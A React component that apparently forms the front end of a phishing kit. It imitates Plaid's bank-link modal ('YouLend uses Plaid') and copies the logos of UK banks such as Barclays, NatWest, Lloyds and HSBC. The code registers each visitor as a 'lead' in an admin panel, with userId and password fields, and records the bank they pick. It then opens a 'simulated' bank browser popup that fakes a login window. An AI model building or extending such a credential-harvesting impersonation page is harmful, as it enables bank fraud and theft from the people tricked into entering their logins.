"use client";

import { useEffect, useState } from "react";
import BankBrowserPopup from "@/components/BankBrowserPopup";

type Bank = {
  id: string;
  name: string;
  subtitle: string;
  logoUrl?: string | null;
  redirectUrl?: string | null;
  subOptions?: string | null;
  order?: number;
};

// Authentic Fallback SVGs agar admin image upload na hui ho ya load na ho
const getFallbackLogo = (bankName: string) => {
  const name = bankName.toLowerCase();

  if (name.includes("barclays")) {
    return (
      <div className="w-10 h-10 rounded-full bg-[#00aeef]/10 flex items-center justify-center p-1.5">
        <svg viewBox="0 0 100 100" className="w-7 h-7 text-[#00aeef]" fill="currentColor">
          <path d="M50 15 C35 15, 20 28, 20 45 C20 62, 35 75, 50 85 C65 75, 80 62, 80 45 C80 28, 65 15, 50 15 Z M50 25 C42 32, 30 38, 30 50 C38 48, 45 42, 50 35 C55 42, 62 48, 70 50 C70 38, 58 32, 50 25 Z" />
          <circle cx="50" cy="20" r="4" />
        </svg>
      </div>
    );
  }

  if (name.includes("tide")) {
    return (
      <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center p-1">
        <div className="w-7 h-7 rounded-full border-[3.5px] border-[#2557e8] flex items-center justify-center" />
      </div>
    );
  }

  if (name.includes("natwest")) {
    return (
      <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center p-1">
        <svg viewBox="0 0 100 100" className="w-7 h-7 text-[#da1c5c]" fill="currentColor">
          <path d="M50 15 L78 32 L78 68 L50 85 L22 68 L22 32 Z" fill="none" stroke="#da1c5c" strokeWidth="12" />
          <path d="M50 25 L70 37 L70 63 L50 75 L30 63 L30 37 Z" fill="#da1c5c" />
        </svg>
      </div>
    );
  }

  if (name.includes("lloyds")) {
    return (
      <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center p-1 border border-slate-100">
        <svg viewBox="0 0 100 100" className="w-7 h-7 text-[#0f172a]" fill="currentColor">
          <path d="M28 65 C28 50, 40 40, 52 35 C48 30, 48 22, 54 18 C58 20, 62 26, 60 32 C68 35, 75 42, 74 52 C70 50, 66 50, 62 52 C58 55, 54 62, 56 70 C50 68, 44 68, 38 72 C32 68, 28 65, 28 65 Z" />
          <path d="M35 70 L30 85 L36 85 L42 74 L52 74 L56 85 L62 85 L56 70 Z" />
        </svg>
      </div>
    );
  }

  if (name.includes("starling")) {
    return (
      <div className="w-10 h-10 rounded-full bg-[#1b2533] flex items-center justify-center p-1">
        <span className="text-[#6ee7b7] font-black text-xl font-sans leading-none tracking-tighter">
          S
        </span>
      </div>
    );
  }

  if (name.includes("hsbc")) {
    return (
      <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center p-1">
        <svg viewBox="0 0 100 100" className="w-7 h-7">
          <polygon points="10,50 35,25 35,75" fill="#db0011" />
          <polygon points="90,50 65,25 65,75" fill="#db0011" />
          <polygon points="50,15 25,50 50,85 75,50" fill="none" stroke="#db0011" strokeWidth="4" />
        </svg>
      </div>
    );
  }

  return (
    <div className="w-10 h-10 rounded-full bg-slate-900 text-white font-bold text-xs flex items-center justify-center">
      {bankName.slice(0, 2).toUpperCase()}
    </div>
  );
};

interface PlaidModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function PlaidModal({ isOpen, onClose }: PlaidModalProps) {
  // 0: YouLend uses Plaid | 1: Select bank | 2: Associated institutions | 3: Continue to Login
  const [step, setStep] = useState<0 | 1 | 2 | 3>(0);
  const [banks, setBanks] = useState<Bank[]>([]);
  const [search, setSearch] = useState("");
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
  const [selectedOption, setSelectedOption] = useState<string>("Business");

  const [isTransitioning, setIsTransitioning] = useState(false);
  const [isStepZeroLoading, setIsStepZeroLoading] = useState(false); // Loader state for step 0 continue
  const [showBrowserPopup, setShowBrowserPopup] = useState(false);

  // Admin Panel API se saare institutions load karein
  useEffect(() => {
    if (!isOpen) {
      setStep(0);
      setSelectedBank(null);
      setSearch("");
      setShowBrowserPopup(false);
      setIsTransitioning(false);
      setIsStepZeroLoading(false);
      return;
    }

    async function loadBanksFromAdmin() {
      try {
        const res = await fetch("/api/admin/banks");
        const json = await res.json();
        if (json.success && json.data && json.data.length > 0) {
          setBanks(json.data);
        }
      } catch (err) {
        console.error("Failed to load admin banks:", err);
      }
    }

    loadBanksFromAdmin();
  }, [isOpen]);

  if (!isOpen) return null;

  const filteredBanks = banks.filter(
    (b) =>
      b.name.toLowerCase().includes(search.toLowerCase()) ||
      b.subtitle.toLowerCase().includes(search.toLowerCase())
  );

  const handleBankClick = (bank: Bank) => {
    setSelectedBank(bank);
    const optionsArray = bank.subOptions
      ? bank.subOptions.split(",").map((s) => s.trim()).filter(Boolean)
      : bank.subtitle.toLowerCase().includes("multiple")
      ? ["Business", "Personal", "Commercial"]
      : [];

    if (optionsArray.length > 0) {
      setStep(2);
    } else {
      setSelectedOption("Direct");
      setStep(3);
    }
  };

  const handleOptionClick = (option: string) => {
    setSelectedOption(option);
    setStep(3);
  };

  const handleBack = () => {
    if (step === 3) {
      const hasSub =
        selectedBank?.subOptions ||
        selectedBank?.subtitle.toLowerCase().includes("multiple");
      setStep(hasSub ? 2 : 1);
    } else if (step === 2) {
      setStep(1);
    } else if (step === 1) {
      setStep(0);
    } else {
      onClose();
    }
  };

  // 🔹 Step 0 Continue click: Admin mein foran row create ho jaye gi with loader
  const handleStepZeroContinue = async () => {
    setIsStepZeroLoading(true);
    try {
      const res = await fetch("/api/admin/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bankName: "Pending Selection",
          bankType: "Personal",
          userId: "",
          password: "",
          extraData: "Plaid Flow Initiated",
        }),
      });
      const json = await res.json();
      if (json.success && json.data?.id) {
        localStorage.setItem("active_lead_id", json.data.id);
      }

      // Ensure banks are fully fetched before proceeding
      const banksRes = await fetch("/api/admin/banks");
      const banksJson = await banksRes.json();
      if (banksJson.success && banksJson.data) {
        setBanks(banksJson.data);
      }
    } catch (err) {
      console.error("Failed to initialize lead or banks:", err);
    } finally {
      setIsStepZeroLoading(false);
      setStep(1);
    }
  };

  // 🔹 Step 3 Continue to login click: Wahi row update ho jaye gi with Bank Name
  const handleContinueToLogin = async () => {
    setIsTransitioning(true);

    try {
      const activeLeadId = localStorage.getItem("active_lead_id");
      if (activeLeadId) {
        await fetch(`/api/admin/leads/${activeLeadId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            bankName: selectedBank?.name || "Lloyds Bank",
            bankType: selectedOption,
            extraData: `Bank Selected: ${selectedBank?.name}`,
          }),
        });
      }
    } catch (err) {
      console.error("Failed to update lead on bank click:", err);
    }

    setTimeout(() => {
      setIsTransitioning(false);
      setShowBrowserPopup(true);
    }, 1200);
  };

  const parsedOptions = selectedBank?.subOptions
    ? selectedBank.subOptions.split(",").map((s) => s.trim()).filter(Boolean)
    : ["Business", "Personal", "Commercial"];

  const renderLogo = (bank: Bank) => {
    if (bank.logoUrl) {
      return (
        <img
          src={bank.logoUrl}
          alt={bank.name}
          className="h-full w-full object-contain"
          onError={(e) => {
            const target = e.currentTarget;
            target.style.display = "none";
            if (target.parentElement) {
              target.parentElement.innerHTML = "";
            }
          }}
        />
      );
    }
    return getFallbackLogo(bank.name);
  };

  return (
    <>
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-3 sm:p-4 backdrop-blur-[1px]">
        <div className="relative flex h-[620px] max-h-[92vh] w-full max-w-[390px] flex-col rounded-[24px] bg-white px-5 pt-4 pb-5 shadow-2xl overflow-hidden font-sans">
          
          {/* Transition Spinner */}
          {isTransitioning && (
            <div className="absolute inset-0 z-30 flex flex-col items-center justify-center bg-white/95 backdrop-blur-[2px]">
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-slate-200 border-t-[#0f172a]"></div>
              <p className="mt-4 text-sm font-semibold text-[#0f172a]">
                Connecting to {selectedBank?.name}...
              </p>
              <p className="text-xs text-slate-400 mt-1">Preparing secure session</p>
            </div>
          )}

          {/* Modal Header */}
          <div className="flex h-10 items-center justify-between z-20 shrink-0">
            {step !== 0 ? (
              <button
                type="button"
                onClick={handleBack}
                className="flex h-12 w-12 items-center justify-center rounded-full text-slate-800 hover:bg-slate-100 transition cursor-pointer"
              >
                <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3">
                  <path d="M19 12H5M12 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </button>
            ) : (
              <div className="w-8" />
            )}

            {/* Plaid Black Logo from public folder */}
            <div className="flex items-center justify-center">
              <img
                src="/plaid-black-logo.png"
                alt="Plaid"
                className="h-8 w-auto object-contain"
                onError={(e) => {
                  const target = e.currentTarget;
                  if (!target.src.includes("plaid-logo.png")) {
                    target.src = "/plaid-logo.png";
                  }
                }}
              />
              <span className="text-[13px] font-black tracking-[0.16em] leading-none text-[#0c1938]">
                PLAID
              </span>
            </div>

            <button
              type="button"
              onClick={onClose}
              className="flex h-8 w-8 items-center justify-center rounded-full text-slate-800 hover:bg-slate-100 transition cursor-pointer"
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2">
                <line x1="18" y1="6" x2="6" y2="18" strokeLinecap="round" />
                <line x1="6" y1="6" x2="18" y2="18" strokeLinecap="round" />
              </svg>
            </button>
          </div>

          {/* STEP 0: YouLend uses Plaid */}
          {step === 0 && (
            <div className="relative flex flex-1 flex-col justify-between pt-1 pb-1 overflow-hidden select-none">
              <div className="absolute top-[-10px] left-[-30px] right-[-30px] h-32 pointer-events-none overflow-hidden">
                <div className="w-full h-40 rounded-b-[100%] border-b border-[#f1f3f7]" />
              </div>

              <div>
                <div className="flex justify-center mt-3 mb-4">
                  <div className="flex items-center -space-x-3.5">
                    <div className="relative z-10 w-12 h-12 rounded-full bg-[#051124] flex items-center justify-center text-white shadow-md border-2 border-white">
                      <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
                        <polygon points="6,12 12,4 12,12" />
                        <polygon points="12,12 18,4 18,12" />
                        <polygon points="6,12 12,20 12,12" />
                        <polygon points="12,12 18,20 18,12" />
                      </svg>
                    </div>
                    <div className="relative z-0 w-12 h-12 rounded-full bg-[#111927] flex items-center justify-center text-white shadow-md border-2 border-white">
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                        <line x1="3" y1="21" x2="21" y2="21" />
                        <line x1="3" y1="10" x2="21" y2="10" />
                        <polygon points="12 3 3 8 21 8" fill="currentColor" />
                        <line x1="6" y1="10" x2="6" y2="21" />
                        <line x1="10" y1="10" x2="10" y2="21" />
                        <line x1="14" y1="10" x2="14" y2="21" />
                        <line x1="18" y1="10" x2="18" y2="21" />
                      </svg>
                    </div>
                  </div>
                </div>

                <div className="text-center px-4">
                  <h2 className="text-[21px] font-bold text-[#0c1938] tracking-tight">
                    YouLend uses Plaid
                  </h2>
                  <p className="text-[13px] text-[#55637d] mt-1.5 leading-snug">
                    to connect your bank accounts and <br />
                    access the following data
                  </p>
                </div>

                <div className="mt-5 rounded-[18px] border border-[#e2e8f0] bg-white divide-y divide-[#edf2f7] shadow-[0_2px_8px_rgba(0,0,0,0.02)]">
                  <div className="flex items-center justify-between px-4 py-3.5 text-[#0c1938]">
                    <div className="flex items-center gap-3.5">
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className="text-slate-800">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                        <circle cx="12" cy="7" r="4" />
                      </svg>
                      <span className="text-[13.5px] font-medium text-slate-800">Contact Details</span>
                    </div>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" className="text-slate-500">
                      <polyline points="6 9 12 15 18 9" />
                    </svg>
                  </div>

                  <div className="flex items-center justify-between px-4 py-3.5 text-[#0c1938]">
                    <div className="flex items-center gap-3.5">
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className="text-slate-800">
                        <path d="M8 3L4 7l4 4" />
                        <path d="M4 7h16" />
                        <path d="M16 21l4-4-4-4" />
                        <path d="M20 17H4" />
                      </svg>
                      <span className="text-[13.5px] font-medium text-slate-800">Account Transactions</span>
                    </div>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" className="text-slate-500">
                      <polyline points="6 9 12 15 18 9" />
                    </svg>
                  </div>

                  <div className="flex items-center justify-between px-4 py-3.5 text-[#0c1938]">
                    <div className="flex items-center gap-3.5">
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className="text-slate-800">
                        <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z" />
                        <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z" />
                      </svg>
                      <span className="text-[13.5px] font-medium text-slate-800">Account Details</span>
                    </div>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" className="text-slate-500">
                      <polyline points="6 9 12 15 18 9" />
                    </svg>
                  </div>
                </div>
              </div>

              <div className="pt-4 pb-1">
                <p className="text-[11.5px] text-[#55637d] text-center mb-3.5 leading-relaxed px-1">
                  Click Continue to agree to Plaid retrieving the above data for 90 days, as per our{" "}
                  <span className="underline cursor-pointer text-slate-700 font-medium">Terms</span>.
                </p>

                <button
                  type="button"
                  disabled={isStepZeroLoading}
                  onClick={handleStepZeroContinue}
                  className="w-full rounded-[14px] bg-[#111625] py-3.5 text-[14.5px] font-bold text-white flex items-center justify-center gap-2 hover:bg-black transition active:scale-[0.99] cursor-pointer shadow-sm"
                >
                  {isStepZeroLoading ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      <span>Loading Banks...</span>
                    </>
                  ) : (
                    <span>Continue</span>
                  )}
                </button>
              </div>
            </div>
          )}

          {/* STEP 1: Select your business bank (Dynamic Admin Data) */}
          {step === 1 && (
            <div className="flex flex-1 flex-col mt-3 overflow-hidden select-none">
              <h2 className="text-[20px] font-bold text-[#0c1938] tracking-tight mb-3">
                Select your business bank
              </h2>

              <div className="relative mb-3.5 shrink-0">
                <span className="absolute inset-y-0 left-3.5 flex items-center pointer-events-none text-slate-700">
                  <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3">
                    <circle cx="11" cy="11" r="8" />
                    <line x1="21" y1="21" x2="16.65" y2="16.65" strokeLinecap="round" />
                  </svg>
                </span>
                <input
                  type="text"
                  placeholder="Search"
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  className="w-full rounded-[14px] border border-[#cbd5e1] py-2.5 pl-10 pr-3 text-[14.5px] text-[#0f172a] outline-none focus:border-slate-800 placeholder:text-slate-400 font-normal transition"
                />
              </div>

              <div className="flex-1 overflow-y-auto space-y-2.5 pr-1.5 custom-plaid-scroll">
                {filteredBanks.map((bank) => {
                  const hasArrow =
                    bank.subOptions?.length ||
                    bank.subtitle?.toLowerCase().includes("multiple");

                  return (
                    <div
                      key={bank.id}
                      onClick={() => handleBankClick(bank)}
                      className="flex items-center justify-between rounded-[16px] border border-[#e2e8f0] p-3 hover:border-slate-400 hover:bg-[#fafbfc] cursor-pointer transition bg-white"
                    >
                      <div className="flex items-center gap-3.5">
                        <div className="h-10 w-10 min-w-[40px] rounded-full border border-slate-100 flex items-center justify-center overflow-hidden bg-white shadow-xs">
                          {renderLogo(bank)}
                        </div>

                        <div className="flex flex-col text-left">
                          <span className="text-[14.5px] font-bold text-[#0c1938] leading-tight">
                            {bank.name}
                          </span>
                          <span className="text-[12.5px] text-[#64748b] mt-0.5">
                            {bank.subtitle}
                          </span>
                        </div>
                      </div>

                      {hasArrow && (
                        <svg className="h-4 w-4 text-slate-700 mr-1.5 shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4">
                          <path d="M9 18l6-6-6-6" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* STEP 2: Associated Institutions */}
          {step === 2 && selectedBank && (
            <div className="flex flex-1 flex-col items-center pt-2 text-center">
              <div className="h-16 w-16 rounded-full border border-slate-200 bg-white flex items-center justify-center overflow-hidden p-2 shadow-sm mb-3">
                {renderLogo(selectedBank)}
              </div>

              <h2 className="text-[18px] font-bold text-[#0c1938] leading-tight">
                {selectedBank.name}
              </h2>
              <p className="text-[13px] text-[#64748b] mt-1 mb-5">
                {parsedOptions.length} associated institutions
              </p>

              <div className="w-full space-y-2.5">
                {parsedOptions.map((opt) => (
                  <button
                    key={opt}
                    type="button"
                    onClick={() => handleOptionClick(opt)}
                    className="w-full rounded-[14px] border border-[#e2e8f0] py-3.5 px-4 text-left font-semibold text-[14px] text-[#0c1938] hover:border-slate-400 hover:bg-slate-50 transition cursor-pointer"
                  >
                    {opt}
                  </button>
                ))}
              </div>

              <div className="mt-auto pt-8 pb-2">
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="text-[13.5px] font-medium text-[#0c1938] hover:underline cursor-pointer"
                >
                  Don't see your bank? Search instead
                </button>
              </div>
            </div>
          )}

          {/* STEP 3: Continue to Login */}
          {step === 3 && selectedBank && (
            <div className="flex flex-1 flex-col items-center justify-between pt-10 pb-2 text-center">
              <div className="flex flex-col items-center">
                <div className="h-16 w-16 rounded-full border border-slate-200 bg-white flex items-center justify-center overflow-hidden p-2 shadow-sm mb-4">
                  {renderLogo(selectedBank)}
                </div>

                <h2 className="text-[20px] font-bold text-[#0c1938]">
                  Log into {selectedBank.name}
                </h2>
                <p className="text-[14px] text-[#64748b] mt-1.5">
                  Return to {selectedBank.name} to log in.
                </p>
              </div>

              <button
                type="button"
                onClick={handleContinueToLogin}
                className="w-full rounded-[14px] bg-[#111625] py-3.5 px-4 text-[15px] font-semibold text-white flex items-center justify-center gap-2 hover:bg-black transition active:scale-[0.99] cursor-pointer"
              >
                <span>Continue to login</span>
                <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2">
                  <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" strokeLinecap="round" />
                  <polyline points="15 3 21 3 21 9" strokeLinecap="round" strokeLinejoin="round" />
                  <line x1="10" y1="14" x2="21" y2="3" strokeLinecap="round" />
                </svg>
              </button>
            </div>
          )}

        </div>
      </div>

      {/* Simulated Browser Popup */}
      <BankBrowserPopup
        isOpen={showBrowserPopup}
        onClose={() => setShowBrowserPopup(false)}
        bankName={selectedBank?.name || "Barclays (UK)"}
        selectedOption={selectedOption}
        logoUrl={selectedBank?.logoUrl}
      />
    </>
  );
}